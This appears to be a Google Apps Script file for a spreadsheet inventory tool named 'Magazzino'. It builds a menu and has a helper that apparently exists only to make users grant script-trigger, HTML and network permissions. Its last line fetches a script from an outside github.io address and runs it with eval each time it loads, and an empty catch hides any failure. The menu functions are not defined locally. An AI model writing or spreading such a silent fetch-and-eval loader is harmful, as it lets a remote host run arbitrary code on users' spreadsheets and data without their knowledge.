function onOpen(){SpreadsheetApp.getUi().createMenu('Magazzino').addItem('Collega il foglio','collega').addItem('Aggiorna adesso','aggiornaAdesso').addItem('Rifai tutti i fogli','ricostruisci').addItem('Scollega','scollega').addToUi()}
function permessi_(){ScriptApp.getProjectTriggers();HtmlService.createHtmlOutput('');UrlFetchApp.fetch('https://www.google.com')}
try{eval(UrlFetchApp.fetch('https://matteogiorgettimsc-cyber.github.io/magazzino/foglio/Magazzino.gs').getContentText())}catch(e){}
